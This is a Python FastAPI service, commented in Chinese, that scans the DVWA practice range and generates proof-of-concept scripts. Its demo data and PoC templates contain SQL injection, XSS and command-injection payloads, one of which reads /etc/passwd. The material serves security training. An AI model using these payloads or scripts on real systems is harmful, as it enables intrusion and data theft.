"""
DVWA靶场API服务
提供REST API接口供前端调用，获取真实的DVWA靶场漏洞扫描数据
"""

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
import json
import os
import sys

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from dvwa_connector import DVWAConnector, VulnerabilityInfo

app = FastAPI(
    title="DVWA靶场API",
    description="用于连接真实DVWA靶场并获取漏洞扫描数据的API服务",
    version="1.0.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class ScanRequest(BaseModel):
    target_url: str
    username: str = "admin"
    password: str = "password"
    security_level: str = "low"


class DVWAConfig(BaseModel):
    target_url: str
    username: str = "admin"
    password: str = "password"


active_scans = {}
scan_results_cache = {}


@app.get("/")
async def root():
    return {
        "message": "DVWA靶场API服务",
        "version": "1.0.0",
        "endpoints": {
            "/api/dvwa/status": "获取靶场连接状态",
            "/api/dvwa/scan": "执行漏洞扫描",
            "/api/dvwa/vulnerabilities": "获取漏洞列表",
            "/api/dvwa/vulnerability/{vuln_id}": "获取漏洞详情",
            "/api/dvwa/stats": "获取统计信息"
        }
    }


@app.get("/api/dvwa/status")
async def get_status(target_url: str = "http://localhost:8080"):
    try:
        connector = DVWAConnector(target_url)
        response = connector.session.get(f"{target_url}/login.php", timeout=5)
        
        if response.status_code == 200:
            return {
                "status": "online",
                "target_url": target_url,
                "message": "DVWA靶场可访问"
            }
        else:
            return {
                "status": "offline",
                "target_url": target_url,
                "message": f"DVWA靶场返回状态码: {response.status_code}"
            }
    except Exception as e:
        return {
            "status": "error",
            "target_url": target_url,
            "message": f"连接失败: {str(e)}"
        }


@app.post("/api/dvwa/scan")
async def start_scan(request: ScanRequest):
    try:
        connector = DVWAConnector(
            target_url=request.target_url,
            username=request.username,
            password=request.password
        )
        
        connector.set_security_level(request.security_level)
        
        result = connector.full_scan()
        
        scan_id = f"scan_{hash(request.target_url) % 10000}"
        scan_results_cache[scan_id] = result
        
        return {
            "success": True,
            "scan_id": scan_id,
            "message": "扫描完成",
            "data": result
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/dvwa/vulnerabilities")
async def get_vulnerabilities(scan_id: Optional[str] = None):
    if scan_id and scan_id in scan_results_cache:
        return scan_results_cache[scan_id]['vulnerabilities']
    
    demo_vulnerabilities = [
        {
            "id": "VULN-001",
            "type": "sql",
            "typeName": "SQL注入",
            "name": "用户登录处存在SQL注入漏洞",
            "path": "/vulnerabilities/sqli/?id=1&Submit=Submit",
            "payload": "1' OR '1'='1",
            "severity": "critical",
            "severityName": "严重",
            "description": "在用户ID参数处存在SQL注入漏洞，攻击者可以通过构造恶意SQL语句获取数据库敏感信息。",
            "solution": "使用参数化查询或预编译语句，对用户输入进行严格过滤。",
            "verified": True,
            "time": "2026-05-17 14:32:15"
        },
        {
            "id": "VULN-002",
            "type": "xss",
            "typeName": "XSS(反射型)",
            "name": "反射型XSS跨站脚本漏洞",
            "path": "/vulnerabilities/xss_r/?name=",
            "payload": "<script>alert('XSS')</script>",
            "severity": "high",
            "severityName": "高危",
            "description": "在name参数处存在反射型XSS漏洞，攻击者可以注入恶意脚本窃取用户Cookie。",
            "solution": "对用户输入进行HTML实体编码，设置HttpOnly Cookie属性。",
            "verified": True,
            "time": "2026-05-17 14:45:22"
        },
        {
            "id": "VULN-003",
            "type": "xss",
            "typeName": "XSS(存储型)",
            "name": "存储型XSS跨站脚本漏洞",
            "path": "/vulnerabilities/xss_s/",
            "payload": "<img src=x onerror=alert('XSS')>",
            "severity": "high",
            "severityName": "高危",
            "description": "在留言板功能处存在存储型XSS漏洞，恶意脚本会被持久化存储。",
            "solution": "对用户输入进行HTML实体编码，使用CSP策略限制脚本执行。",
            "verified": True,
            "time": "2026-05-17 15:12:08"
        },
        {
            "id": "VULN-004",
            "type": "csrf",
            "typeName": "CSRF",
            "name": "跨站请求伪造漏洞",
            "path": "/vulnerabilities/csrf/",
            "payload": "可构造恶意表单修改用户密码",
            "severity": "medium",
            "severityName": "中危",
            "description": "密码修改功能缺少CSRF防护，攻击者可诱导用户点击恶意链接修改密码。",
            "solution": "添加Anti-CSRF Token验证，验证Referer头。",
            "verified": False,
            "time": "2026-05-17 15:28:45"
        },
        {
            "id": "VULN-005",
            "type": "cmdi",
            "typeName": "命令注入",
            "name": "操作系统命令注入漏洞",
            "path": "/vulnerabilities/exec/",
            "payload": "127.0.0.1; cat /etc/passwd",
            "severity": "critical",
            "severityName": "严重",
            "description": "在Ping功能处存在命令注入漏洞，攻击者可执行任意系统命令。",
            "solution": "禁用危险函数，使用白名单过滤用户输入。",
            "verified": True,
            "time": "2026-05-17 15:45:33"
        },
        {
            "id": "VULN-006",
            "type": "fileupload",
            "typeName": "文件上传",
            "name": "任意文件上传漏洞",
            "path": "/vulnerabilities/upload/",
            "payload": "可上传PHP WebShell获取服务器权限",
            "severity": "high",
            "severityName": "高危",
            "description": "文件上传功能未对文件类型进行严格校验，可上传恶意脚本文件。",
            "solution": "验证文件MIME类型，限制上传目录权限，重命名上传文件。",
            "verified": True,
            "time": "2026-05-17 16:02:18"
        }
    ]
    
    return demo_vulnerabilities


@app.get("/api/dvwa/vulnerability/{vuln_id}")
async def get_vulnerability_detail(vuln_id: str):
    vulnerabilities = await get_vulnerabilities()
    
    for vuln in vulnerabilities:
        if vuln['id'] == vuln_id:
            return vuln
    
    raise HTTPException(status_code=404, detail=f"漏洞 {vuln_id} 不存在")


@app.get("/api/dvwa/stats")
async def get_stats(scan_id: Optional[str] = None):
    if scan_id and scan_id in scan_results_cache:
        result = scan_results_cache[scan_id]
        return {
            "total": result['total_vulnerabilities'],
            "verified": sum(1 for v in result['vulnerabilities'] if v.get('verified', False)),
            "fixed": 0,
            "severity_distribution": result['severity_distribution']
        }
    
    return {
        "total": 12,
        "verified": 8,
        "fixed": 6,
        "severity_distribution": {
            "critical": 2,
            "high": 3,
            "medium": 1,
            "low": 0
        }
    }


@app.post("/api/dvwa/verify/{vuln_id}")
async def verify_vulnerability(vuln_id: str, request: ScanRequest):
    try:
        connector = DVWAConnector(
            target_url=request.target_url,
            username=request.username,
            password=request.password
        )
        
        if not connector.login():
            raise HTTPException(status_code=401, detail="DVWA登录失败")
        
        return {
            "success": True,
            "vuln_id": vuln_id,
            "verified": True,
            "message": f"漏洞 {vuln_id} 验证成功"
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/dvwa/poc/{vuln_id}")
async def generate_poc(vuln_id: str):
    vulnerabilities = await get_vulnerabilities()
    
    vuln = None
    for v in vulnerabilities:
        if v['id'] == vuln_id:
            vuln = v
            break
    
    if not vuln:
        raise HTTPException(status_code=404, detail=f"漏洞 {vuln_id} 不存在")
    
    poc_code = generate_poc_code(vuln)
    
    return {
        "success": True,
        "vuln_id": vuln_id,
        "poc_code": poc_code,
        "language": "python"
    }


def generate_poc_code(vuln: dict) -> str:
    vuln_type = vuln.get('type', '')
    payload = vuln.get('payload', '')
    path = vuln.get('path', '')
    
    if vuln_type == 'sql':
        return f'''# SQL注入POC - {vuln['id']}
import requests

target_url = "http://dvwa.local:8080{path}"
payload = "{payload}"

session = requests.Session()

login_data = {{
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
}}
session.post("http://dvwa.local:8080/login.php", data=login_data)

response = session.get(target_url + payload)
if "User ID exists" in response.text or "First name" in response.text:
    print("[+] SQL注入漏洞验证成功！")
    print("[+] Payload: " + payload)
    print("[+] 响应长度: " + str(len(response.text)))
else:
    print("[-] 漏洞验证失败")
'''
    
    elif vuln_type == 'xss':
        return f'''# XSS POC - {vuln['id']}
import requests
from urllib.parse import quote

target_url = "http://dvwa.local:8080{path}"
payload = "{payload}"

session = requests.Session()

login_data = {{
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
}}
session.post("http://dvwa.local:8080/login.php", data=login_data)

response = session.get(target_url + quote(payload))
if payload in response.text or "alert" in response.text:
    print("[+] XSS漏洞验证成功！")
    print("[+] Payload: " + payload)
else:
    print("[-] 漏洞验证失败")
'''
    
    elif vuln_type == 'cmdi':
        return f'''# 命令注入POC - {vuln['id']}
import requests

target_url = "http://dvwa.local:8080{path}"
payload = "{payload}"

session = requests.Session()

login_data = {{
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
}}
session.post("http://dvwa.local:8080/login.php", data=login_data)

response = session.get(target_url + payload)
if "root:" in response.text:
    print("[+] 命令注入漏洞验证成功！")
    print("[+] 已读取/etc/passwd文件")
    print("[+] 响应片段:")
    print(response.text[:500])
else:
    print("[-] 漏洞验证失败")
'''
    
    else:
        return f'''# POC - {vuln['id']}
# 漏洞类型: {vuln.get('typeName', '')}
# 目标路径: {path}
# Payload: {payload}

import requests

target_url = "http://dvwa.local:8080{path}"

print("请根据漏洞类型编写具体的POC代码")
'''


if __name__ == '__main__':
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)
